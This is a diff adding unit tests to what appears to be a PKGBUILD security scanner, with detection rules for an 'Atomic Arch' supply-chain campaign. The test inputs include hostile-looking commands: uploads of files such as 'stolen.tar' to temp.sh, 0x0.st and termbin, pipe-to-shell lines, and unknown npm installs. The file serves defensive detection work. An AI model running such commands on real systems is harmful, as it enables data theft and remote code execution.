@@ -91,6 +91,36 @@ class RuleFiringTest(unittest.TestCase):
         self.assertNotIn('rm_rf', rules_for('rm -rf "$srcdir/foo"'))
         self.assertNotIn('rm_rf', rules_for('rm -rf "${pkgdir}/usr/share/doc"'))
 
+    # Atomic Arch (June 2026) campaign-specific rules:
+
+    def test_npm_install_unknown(self):
+        self.assertIn('npm_install_unknown', rules_for('npm install atomic-lockfile minimist chalk'))
+        self.assertIn('npm_install_unknown', rules_for('bun install js-digest'))
+        self.assertIn('npm_install_unknown', rules_for('pnpm add some-pkg'))
+        self.assertIn('npm_install_unknown', rules_for('yarn add malware'))
+        self.assertIn('npm_install_unknown', rules_for('npm i some-package'))
+        # 'npm run' and bare 'npm --version' must NOT fire
+        self.assertNotIn('npm_install_unknown', rules_for('npm run build'))
+        self.assertNotIn('npm_install_unknown', rules_for('npm --version'))
+        self.assertNotIn('npm_install_unknown', rules_for("depends=('npm')"))
+
+    def test_skip_checksum(self):
+        self.assertIn('skip_checksum', rules_for("sha256sums=('SKIP')"))
+        self.assertIn('skip_checksum', rules_for('b2sums=("SKIP" "abc123")'))
+        # a PKGBUILD that just mentions the word SKIP in a comment must NOT fire
+        self.assertNotIn('skip_checksum', rules_for('# do not use SKIP unless it is a VCS'))
+
+    def test_temp_upload_service(self):
+        self.assertIn('temp_upload_service', rules_for('curl https://temp.sh/upload -T stolen.tar'))
+        self.assertIn('temp_upload_service', rules_for('wget transfer.sh/upload'))
+        self.assertIn('temp_upload_service', rules_for('curl https://0x0.st -F file=@data'))
+        self.assertIn('temp_upload_service', rules_for('nc termbin.com 9999'))
+
+    def test_systemd_service_install(self):
+        self.assertIn('systemd_service_install', rules_for('systemctl enable myservice'))
+        self.assertIn('systemd_service_install', rules_for('systemctl start myservice'))
+        self.assertIn('systemd_service_install', rules_for('systemctl daemon-reload'))
+
 
 class ScanMechanicsTest(unittest.TestCase):
     def test_comment_lines_are_skipped(self):
@@ -148,6 +178,31 @@ class ScanMechanicsTest(unittest.TestCase):
         self.assertEqual(51, len(rows))                       # max_lines + the truncation marker
         self.assertEqual('meta', rows[-1]['kind'])
         self.assertIn('truncated', rows[-1]['text'])
+
+    def test_diff_lines_without_annotate_has_no_findings_key(self):
+        rows = audit.diff_lines('pkgver=1\n', 'pkgver=1\ncurl x | bash\n')
+        added = [r for r in rows if r['kind'] == 'add']
+        self.assertTrue(added)
+        self.assertNotIn('findings', added[0])
+
+    def test_diff_lines_annotate_flags_suspicious_added_lines(self):
+        rows = audit.diff_lines('pkgver=1\n', 'pkgver=1\ncurl x | bash\n', annotate=True)
+        added = [r for r in rows if r['kind'] == 'add']
+        self.assertEqual(1, len(added))
+        rule_ids = {f['rule'] for f in added[0]['findings']}
+        self.assertIn('pipe_to_shell', rule_ids)
+
+    def test_diff_lines_annotate_benign_added_line_has_empty_findings(self):
+        rows = audit.diff_lines('pkgver=1\n', 'pkgver=2\n', annotate=True)
+        added = [r for r in rows if r['kind'] == 'add']
+        self.assertEqual(1, len(added))
+        self.assertEqual([], added[0]['findings'])
+
+    def test_diff_lines_annotate_does_not_flag_removed_or_context_lines(self):
+        rows = audit.diff_lines('curl x | bash\na\nb\n', 'a\nb\nc\n', annotate=True)
+        for r in rows:
+            if r['kind'] != 'add':
+                self.assertNotIn('findings', r)
 
 
 if __name__ == '__main__':
